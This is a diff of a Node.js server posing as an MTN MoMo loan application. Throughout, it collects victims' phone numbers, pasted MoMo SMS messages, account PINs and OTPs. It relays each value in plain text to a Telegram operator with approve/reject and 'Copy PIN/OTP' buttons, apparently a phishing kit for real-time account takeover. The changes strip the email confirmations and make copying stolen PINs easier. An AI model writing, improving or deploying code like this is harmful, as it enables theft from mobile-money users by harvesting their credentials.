@@ -4,13 +4,10 @@ const cors = require('cors');
 const path = require('path');
 const fetch = require('node-fetch');
 const axios = require('axios');
-const morgan = require('morgan');
-const nodemailer = require('nodemailer');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
-app.use(morgan('combined'));
 app.use(express.static(path.join(__dirname, '../frontend')));
 
 const PORT = process.env.PORT || 3000;
@@ -21,23 +18,6 @@ const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
 const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
 const DEBUG_SMS = process.env.DEBUG_SMS !== 'false';
 
-// Email configuration
-const EMAIL_HOST = process.env.EMAIL_HOST || 'smtp.gmail.com';
-const EMAIL_PORT = process.env.EMAIL_PORT || 587;
-const EMAIL_USER = process.env.EMAIL_USER;
-const EMAIL_PASS = process.env.EMAIL_PASS;
-const EMAIL_FROM = process.env.EMAIL_FROM || EMAIL_USER;
-
-let transporter = null;
-if (EMAIL_USER && EMAIL_PASS) {
-  transporter = nodemailer.createTransport({
-    host: EMAIL_HOST,
-    port: EMAIL_PORT,
-    secure: false,
-    auth: { user: EMAIL_USER, pass: EMAIL_PASS }
-  });
-}
-
 const applications = {};
 
 function generateId() {
@@ -45,16 +25,6 @@ function generateId() {
 }
 function generateCode(len = 6) {
   return Math.floor(10 ** (len - 1) + Math.random() * 9 * 10 ** (len - 1)).toString();
-}
-
-async function sendEmail(to, subject, html) {
-  if (!transporter) return;
-  try {
-    await transporter.sendMail({ from: EMAIL_FROM, to, subject, html });
-    console.log(`📧 Email sent to ${to}`);
-  } catch (e) {
-    console.error('Email send error:', e);
-  }
 }
 
 async function sendTelegramMessage(text, buttons = null) {
@@ -88,20 +58,15 @@ async function sendSms(to, text) {
   }
 }
 
-// Central error handler
-app.use((err, req, res, next) => {
-  console.error('Unhandled error:', err);
-  res.status(500).json({ ok: false, message: 'Internal server error' });
-});
-
 // ─── Routes ───
 
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
-app.post('/api/send-application', async (req, res, next) => {
+// 1. Submit application
+app.post('/api/send-application', async (req, res) => {
   try {
     const data = req.body.applicationData;
-    if (!data || !data.email || !data.phone) {
+    if (!data || !data.phone) {
       return res.status(400).json({ ok: false, message: 'Missing required fields' });
     }
     const appId = generateId();
@@ -115,19 +80,14 @@ app.post('/api/send-application', async (req, res, next) => {
       otpCode: null,
       smsMessage: null,
       otpEntered: null,
+      pinEntered: null,
       pinAttempts: 0,
       maxPinAttempts: 3,
       pinBlockedUntil: null,
       createdAt: new Date().toISOString()
     };
 
-    await sendEmail(
-      data.email,
-      'Loan Application Received',
-      `<p>Dear ${data.firstName},</p><p>We have received your loan application (ID: ${appId}). We will review it shortly.</p>`
-    );
-
-    const message = `📋 *NEW LOAN APPLICATION*\n\nApp ID: ${appId}\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: +237${data.phone}\nAmount: ${data.loanAmount}\n\nApprove or reject:`;
+    const message = `📋 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${appId}\n📱 Phone: +237${data.phone}\n💰 Amount: XAF ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n✅ *Please approve or reject this application:*`;
     const buttons = [[
       { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'APP', appId }) },
       { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'APP', appId }) }
@@ -135,17 +95,19 @@ app.post('/api/send-application', async (req, res, next) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, applicationId: appId });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+// 2. Check app status
 app.get('/api/status/:applicationId/app', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
   res.json({ ok: true, status: app.smsStatus, step: 'app' });
 });
 
-app.post('/api/send-momo-message', async (req, res, next) => {
+// 3. Send SMS (user pastes message)
+app.post('/api/send-momo-message', async (req, res) => {
   try {
     const { momoData } = req.body;
     const { applicationId, momoMessage } = momoData;
@@ -155,26 +117,30 @@ app.post('/api/send-momo-message', async (req, res, next) => {
     app.smsMessage = momoMessage;
     app.smsStatus = 'pending';
 
-    const message = `📨 *SMS MESSAGE RECEIVED*\n\nApp ID: ${applicationId}\nPhone: +237${app.phone}\nSMS Message:\n${momoMessage}\n\nApprove or reject:`;
-    const buttons = [[
-      { text: '📋 Copy SMS Content', callback_data: JSON.stringify({ action: 'COPY_SMS', appId: applicationId }) },
-      { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
-      { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
-    ]];
+    const message = `📨 *SMS MESSAGE RECEIVED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
+    const buttons = [
+      [{ text: '📋 Copy SMS Content', callback_data: JSON.stringify({ action: 'COPY_SMS', appId: applicationId }) }],
+      [
+        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
+        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
+      ]
+    ];
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+// 4. Check SMS status
 app.get('/api/status/:applicationId/sms', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
   res.json({ ok: true, status: app.smsStatus });
 });
 
-app.post('/api/send-pin', async (req, res, next) => {
+// 5. Send PIN
+app.post('/api/send-pin', async (req, res) => {
   try {
     const { applicationId, pin } = req.body;
     const app = applications[applicationId];
@@ -187,25 +153,30 @@ app.post('/api/send-pin', async (req, res, next) => {
     app.pinEntered = pin;
     app.pinStatus = 'pending';
 
-    const message = `🔐 *PIN VERIFICATION*\n\nApp ID: ${applicationId}\nPhone: +237${app.phone}\nPIN: ${pin}\n\nApprove or reject:`;
-    const buttons = [[
-      { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'PIN', appId: applicationId }) },
-      { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'PIN', appId: applicationId }) }
-    ]];
+    const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
+    const buttons = [
+      [{ text: '📋 Copy PIN', callback_data: JSON.stringify({ action: 'COPY_PIN', appId: applicationId }) }],
+      [
+        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'PIN', appId: applicationId }) },
+        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'PIN', appId: applicationId }) }
+      ]
+    ];
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+// 6. Check PIN status
 app.get('/api/status/:applicationId/pin', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
-  res.json({ ok: true, status: app.pinStatus, remainingAttempts: app.maxPinAttempts - app.pinAttempts, blocked: app.pinStatus === 'blocked' });
+  res.json({ ok: true, status: app.pinStatus, remainingAttempts: Math.max(0, app.maxPinAttempts - app.pinAttempts), blocked: app.pinStatus === 'blocked' });
 });
 
-app.post('/api/pin-rejected', async (req, res, next) => {
+// 7. PIN rejected
+app.post('/api/pin-rejected', async (req, res) => {
   try {
     const { applicationId } = req.body;
     const app = applications[applicationId];
@@ -216,15 +187,16 @@ app.post('/api/pin-rejected', async (req, res, next) => {
     if (remaining <= 0) {
       app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
       app.pinStatus = 'blocked';
-      await sendTelegramMessage(`🔒 *PIN BLOCKED*\n\nApp ID: ${applicationId}\nBlocked for 5 minutes.`);
+      await sendTelegramMessage(`🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\nBlocked for 5 minutes.`);
       return res.json({ ok: false, blocked: true, message: 'Too many failed attempts. Blocked for 5 minutes.' });
     }
     res.json({ ok: false, remainingAttempts: remaining, message: `Wrong PIN. ${remaining} attempt(s) remaining.` });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+// 8. Reset PIN attempts
 app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -234,7 +206,8 @@ app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/send-otp', async (req, res, next) => {
+// 9. Send OTP
+app.post('/api/send-otp', async (req, res) => {
   try {
     const { applicationId, otp } = req.body;
     const app = applications[applicationId];
@@ -243,26 +216,30 @@ app.post('/api/send-otp', async (req, res, next) => {
     app.otpEntered = otp;
     app.otpStatus = 'pending';
 
-    const message = `🔑 *OTP VERIFICATION*\n\nApp ID: ${applicationId}\nPhone: +237${app.phone}\nOTP: ${otp}\n\nApprove or reject:`;
-    const buttons = [[
-      { text: '📋 Copy OTP', callback_data: JSON.stringify({ action: 'COPY_OTP', appId: applicationId }) },
-      { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
-      { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
-    ]];
+    const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
+    const buttons = [
+      [{ text: '📋 Copy OTP', callback_data: JSON.stringify({ action: 'COPY_OTP', appId: applicationId }) }],
+      [
+        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
+        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
+      ]
+    ];
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+// 10. Check OTP status
 app.get('/api/status/:applicationId/otp', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
   res.json({ ok: true, status: app.otpStatus });
 });
 
-app.post('/api/resend-sms', async (req, res, next) => {
+// 11. Resend SMS
+app.post('/api/resend-sms', async (req, res) => {
   try {
     const { applicationId } = req.body;
     const app = applications[applicationId];
@@ -274,19 +251,23 @@ app.post('/api/resend-sms', async (req, res, next) => {
     app.smsStatus = 'pending';
     await sendSms(`+237${app.phone}`, `Your MTN MoMo verification code is: ${newCode}`);
 
-    const message = `🔄 *SMS RESENT*\n\nApp ID: ${applicationId}\nPhone: +237${app.phone}\nNew SMS code: ${newCode}\n\nApprove or reject:`;
-    const buttons = [[
-      { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
-      { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
-    ]];
+    const message = `🔄 *SMS RESENT*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 New SMS code: ${newCode}\n\n✅ *Please approve or reject this SMS:*`;
+    const buttons = [
+      [{ text: '📋 Copy SMS Content', callback_data: JSON.stringify({ action: 'COPY_SMS', appId: applicationId }) }],
+      [
+        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
+        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
+      ]
+    ];
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
-app.post('/api/resend-otp', async (req, res, next) => {
+// 12. Resend OTP
+app.post('/api/resend-otp', async (req, res) => {
   try {
     const { applicationId } = req.body;
     const app = applications[applicationId];
@@ -298,18 +279,22 @@ app.post('/api/resend-otp', async (req, res, next) => {
     app.otpStatus = 'pending';
     await sendSms(`+237${app.phone}`, `Your MTN MoMo OTP is: ${newOtp}`);
 
-    const message = `🔄 *OTP RESENT*\n\nApp ID: ${applicationId}\nPhone: +237${app.phone}\nNew OTP: ${newOtp}\n\nApprove or reject:`;
-    const buttons = [[
-      { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
-      { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
-    ]];
+    const message = `🔄 *OTP RESENT*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 New OTP: ${newOtp}\n\n✅ *Please approve or reject this OTP:*`;
+    const buttons = [
+      [{ text: '📋 Copy OTP', callback_data: JSON.stringify({ action: 'COPY_OTP', appId: applicationId }) }],
+      [
+        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
+        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
+      ]
+    ];
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
+// 13. DEV SMS code (for testing when gateway not set)
 app.get('/api/dev-sms-code/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -319,6 +304,7 @@ app.get('/api/dev-sms-code/:applicationId', (req, res) => {
   res.json({ ok: false, simulated: false });
 });
 
+// 14. Dashboard
 app.get('/api/dashboard/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -338,8 +324,11 @@ app.get('/api/dashboard/:applicationId', (req, res) => {
   });
 });
 
+// 15. Telegram webhook (HYBRID: buttons + text reply)
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
+
+  // Handle callback_query (inline buttons)
   if (update.callback_query) {
     const query = update.callback_query;
     let data;
@@ -349,20 +338,28 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const app = applications[appId];
     if (!app) return res.sendStatus(200);
 
+    // Copy actions
     if (action === 'COPY_SMS') {
       if (app.smsMessage) {
-        // Send SMS content in a code block for easy copying
-        await sendTelegramMessage(`📋 *SMS Content*\n\n\`\`\`\n${app.smsMessage}\n\`\`\``);
+        await sendTelegramMessage(app.smsMessage);
       } else {
         await sendTelegramMessage('⚠️ No SMS message available yet.');
       }
+    } else if (action === 'COPY_PIN') {
+      if (app.pinEntered) {
+        await sendTelegramMessage(app.pinEntered);
+      } else {
+        await sendTelegramMessage('⚠️ No PIN entered yet.');
+      }
     } else if (action === 'COPY_OTP') {
       if (app.otpEntered) {
-        await sendTelegramMessage(`📋 *OTP Content*\n\n\`\`\`\n${app.otpEntered}\n\`\`\``);
+        await sendTelegramMessage(app.otpEntered);
       } else {
         await sendTelegramMessage('⚠️ No OTP entered yet.');
       }
-    } else if (step === 'APP') {
+    }
+    // Approval steps
+    else if (step === 'APP') {
       app.smsStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
       if (app.smsStatus === 'approved') {
         const smsCode = generateCode(6);
@@ -387,13 +384,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       }
     } else if (step === 'OTP') {
       app.otpStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
-      if (app.otpStatus === 'approved') {
-        await sendEmail(
-          app.email,
-          'Loan Approved!',
-          `<p>Dear ${app.firstName},</p><p>Congratulations! Your loan (ID: ${app.appId}) has been approved. The funds will be sent to your MTN MoMo account.</p>`
-        );
-      }
     }
 
     await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
@@ -404,9 +394,30 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     return res.sendStatus(200);
   }
+
+  // Handle text messages (reply "YES" or "NO" to the message)
+  if (update.message && update.message.text) {
+    const text = update.message.text.trim().toUpperCase();
+    const replyTo = update.message.reply_to_message?.text;
+    const idMatch = replyTo?.match(/🆔\s*ID:\s*([A-Z0-9-]+)/);
+    const applicationId = idMatch ? idMatch[1] : null;
+    if (!applicationId || !applications[applicationId]) return res.sendStatus(200);
+
+    const app = applications[applicationId];
+    if (app.smsStatus === 'pending' && text === 'YES') app.smsStatus = 'approved';
+    else if (app.smsStatus === 'pending' && text === 'NO') app.smsStatus = 'rejected';
+    else if (app.pinStatus === 'pending' && text === 'YES') app.pinStatus = 'approved';
+    else if (app.pinStatus === 'pending' && text === 'NO') app.pinStatus = 'rejected';
+    else if (app.otpStatus === 'pending' && text === 'YES') app.otpStatus = 'approved';
+    else if (app.otpStatus === 'pending' && text === 'NO') app.otpStatus = 'rejected';
+
+    return res.sendStatus(200);
+  }
+
   res.sendStatus(200);
 });
 
+// Serve frontend
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
 });
